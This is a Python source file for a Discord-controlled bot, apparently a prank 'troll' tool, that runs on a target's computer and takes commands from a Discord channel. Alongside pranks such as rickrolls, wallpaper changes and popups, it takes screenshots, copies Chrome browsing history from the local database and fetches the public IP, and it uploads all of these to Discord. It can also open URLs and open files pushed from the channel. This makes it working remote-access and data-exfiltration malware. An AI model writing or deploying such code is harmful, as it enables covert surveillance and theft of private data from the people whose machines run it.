import subprocess
import sys
import os
import time
import webbrowser
import discord
from discord.ext import commands 
import pyautogui
import platform
import tkinter as tk
from tkinter import messagebox
import pygetwindow as gw
import ctypes
from playsound3 import playsound
import sqlite3
import requests
import shutil
import random
import asyncio

#Variables and stuff
strid = ""

script_dir = os.path.dirname(os.path.abspath(__file__))

scrnm = 'Screenshot.png'

scrdir = os.path.join(script_dir, scrnm)

history_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/History'

hisout = 'history.txt'

hos = "hiscopy"

hoscopy = os.path.join(script_dir, hos)

historyoutput = os.path.join(script_dir, hisout)

app_data = os.getenv('LOCALAPPDATA')

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

autovar = False

#Debug code
print("START")

#Token and channel id
Token = "Insert bot token"
chnid = 0 #Channel id

#Get identifcation for direct commands
try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() doesn't work
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
strid = user

#Intents
intents = discord.Intents.all() #To lazy to do each one

bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

#Command functions
def writefunct(text):
    if text != None:
            print(text)    
    else:
        text = "Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy."  #Replace with desired text,
    
    if platform.system() == "Windows":  #open using os' image opening application
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        time.sleep(2)
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
            pyautogui.write(f"{text}", interval=0.05)  #pyauotgui kinda sucks so if text gets skiped im not fixing it
            return
        else:
            returnvar = 2
            return returnvar

    elif platform.system() == "Darwin": #Apple/Mac support added when in can text
        print(0)
        return

    else: #linux the best one that I can't test
        print(0)
        return

    
def urlfunct(url): #self explanitory
    webbrowser.open(url)


def promptfunct(name, text):
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    if text == None:
        text = "Regularly scheduled Jumpscare"

    if name == strid:
        messagebox.showinfo("Special Important message", f"{text}")

    else:
        messagebox.showinfo("Important message", f"{text}")


def wallfunct(imagepth, perm):          #make function work on all os later
    if not os.path.isfile(imagepth):
        print(f"File not found: {imagepth}")
        return
    
    absimagepath = os.path.abspath(imagepth)
    print(absimagepath)
    if perm == 'perm':
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}, Permenant"                           
    else:
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_SENDCHANGE)
        imvar = f"Wallpaper changed: {strid}"
    return imvar
    

def historyfunct():
    if app_data:
    #Construct the path to the Chrome history file
        history_path = os.path.join(app_data, 'Google', 'Chrome', 'User Data', 'Default', 'History')

    if not os.path.exists(historyoutput):
        with open(historyoutput, 'w') as file:
            file.write("History\n")

    #Connect to the database
    shutil.copy(history_path, hoscopy)
    
    conn = sqlite3.connect(hoscopy)
    cursor = conn.cursor()

    #Query to get the browsing history
    query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
    cursor.execute(query)

    #Fetch and format the results
    results = cursor.fetchall()

    with open(historyoutput, 'w', encoding='utf-8') as file:
        file.write(f"--- History Dump at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        for row in results:
            file.write(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        file.write("\n")
    conn.close()
    os.remove(hoscopy)

    
def openimgfunc(file_path):
    if os.path.exists(file_path):
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')

    if platform.system() == "Windows":  #open using os' image opening application
        os.startfile(file_path)
    elif platform.system() == "Darwin":
        subprocess.call(["open", file_path])
    else:
        subprocess.call(["xdg-open", file_path])

def delimgfunc(file_path):
    time.sleep(10)      #wait before delete so image can load even if device is slow

    #Delete the file
    os.remove(file_path)

    time.sleep(5)

    if os.path.exists(file_path): #debug: wait and check if like image is deleted
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')


#Events and commands.  Example: !test
@bot.event #When bot connects to server
async def on_ready():
    print("Running")                                    #Debug
    channel = bot.get_channel(chnid)                    #Get the specifed channel
    await channel.send(f"Operating: {strid}")           #Send message to server
    promptfunct("all", "Sdotpy Running")


@bot.command(name='stop')#To close specified online bots
async def stop(ctx, *, name: str = None):
    if name == strid or name == "all":   #Send command to only directed bot
        await ctx.send(f"Shuting down: {strid}")
        sys.exit()


@bot.command(name='test')#Test if bot can receive
async def test(ctx, *, name: str = None):
    if name == strid:                           #Sends message "dirrecive" with id to verify direct receive function works
        await ctx.send(f'Ver 2.0, Directed recive: {strid}')
    elif name == "all":                         #Sends message "recive" with id to verify receive all function works
        await ctx.send(f"Ver 2.0, Recive: {strid}")
    else:                                       #Does nothing because target destination is mispelled or not the directed bot
        await ctx.send("Invalid test")
        print("0")


@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid or name == "all":                   #Send to only specified id
        pyautogui.screenshot(scrdir) #take screenshot
        await ctx.send(content=f"Screen:{strid}", file=discord.File(scrdir)) #send screenshot
        try:
            # Delete the file
            os.remove(scrdir)
        except Exception as e:
                print("ohno") 


@bot.command(name='write')#Check function for details
async def write(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all":
        returnvar = writefunct(text)
        if returnvar == 2:
            await ctx.send("Error")
        else:
            await ctx.send(f"Write:{strid}")


@bot.command(name='rick')#Check function for details
async def rick(ctx, *, name: str = None):
    if name == strid or name == "all":
        url = 'https://www.youtube.com/watch?v=p7YXXieghto'
        urlfunct(url)
        await ctx.send(f'Rickrolled: {strid}')


@bot.command(name='altrick')#Check function for details
async def altrick(ctx, *, name: str = None):
    if name == strid or name == "all":
        url = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=FGFWE2OV0m9utxLc'
        urlfunct(url)
        await ctx.send(f'Animated rickrolled: {strid}')


@bot.command(name='url')#Check function for details
async def url(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all":
        url = f'{text}'
        urlfunct(url)
        await ctx.send(f'Url opened: {strid}')


@bot.command(name='openimg')
async def openimg(ctx, *, name: str = None):
    if name == strid or name == "all":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                openimgfunc(file_path)
                await ctx.send(f'Opened Img: {strid}')
                delimgfunc(file_path)

            except Exception as e:
                await ctx.send(f'Failed command: {e}')
        else:
            await ctx.send('No file attached')


@bot.command(name='prompt')#Check function for details
async def prompt(ctx, name: str = None, *, text: str = None):
    if name == strid or name == "all":                         
        await ctx.send(f"Prompt Sent:{strid}")
        promptfunct(name, text)
        await ctx.send(f'Prompt Clicked: {strid}')


@bot.command(name='wallpaper')#Check function for details
async def wallpaper(ctx, name: str = None, *, perm: str = None): 
    if name == strid or name == "all":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            imgpth = attachment.filename  # Get the name of the file
            try:
                file_path = os.path.join('.', imgpth) 
                await attachment.save(file_path)
                print(file_path)
                imvar = wallfunct(file_path, perm)
                if imvar == "":
                    print(0)
                else:
                    await ctx.send(imvar)
            except:
                await ctx.send(f'Failed to download the fil')     
        else:
            await ctx.send('No file atached')


@bot.command(name='audio')#Check function for details
async def audio(ctx, *, name: str = None):
    if name == strid or name == "all":            
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            print("atach")
            audpth = attachment.filename  # Get the name of the file
            print(audpth)
            audie = os.path.join('.', audpth)
            await attachment.save(audie)
            print("Playing")
            await ctx.send(f'Audio Playing: {strid}')
            playsound(audie)
            os.remove(audie)
        else:
            await ctx.send('No file atached')                            
        

@bot.command(name='history')
async def history(ctx, *, name: str = None):
    if name == strid or name == "all":
        historyfunct()                           
        await ctx.send(content=f'💀History💀:{strid}', file=discord.File(historyoutput))
        os.remove(historyoutput)
        promptfunct(strid, "Search History Sent")


@bot.command(name='grabip')
async def grabip(ctx, *, name: str = None):
    if name == strid or name == "all":                           
        response = requests.get('https://api.ipify.org?format=json')
        publicip = response.json()['ip']

        print(f"Public IP Address: {publicip}")
        await ctx.send(content=f'💀dirgrabip💀{name}:{publicip}')
        promptfunct(strid, "Public IP Sent")

#WORK IN PROGRESS
functions = [lambda chnid, name="all": rick(chnid, name=name),
             lambda chnid, name="all": grabip(chnid, name=name),
             lambda chnid, name="all": history(chnid, name=name),
             lambda chnid, name="all": altrick(chnid, name=name),
             lambda chnid, name="all": screen(chnid, name=name)]            

@bot.command(name='autoswap')
async def autoswap(ctx, name: str = None, *, autov: str = "true"):
    global autovar
    if autov.lower() in 'true':
        if name == strid or name == "all":                 
            autovar = autov.lower() == 'true'
            await ctx.send(f'Direct Auto set to {autovar}: {strid}')
    else:
        await ctx.send('Enter "true" or "false"')

@bot.command(name='autotroll')
async def autotroll(ctx, *, name: str = None):
    global autovar
    if autovar == True:
        if name == strid or name == "all":    
            await ctx.send('Autotroll Enabled')                       
            while autovar == True:  ###
                autof = random.choice(functions)
                print(autof)
                await autof(ctx)
                await asyncio.sleep(150)
    else:
        await ctx.send('Use autoswap and enter "true"')

@bot.command(name='extra')
async def extra(ctx, *, name: str = None):
    if name == strid:                           
        await ctx.send(f'dirrecive: {strid}')
    elif name == "all":                         
        await ctx.send(f"recived: {strid}")
    else:
        print("0")

bot.run(Token)
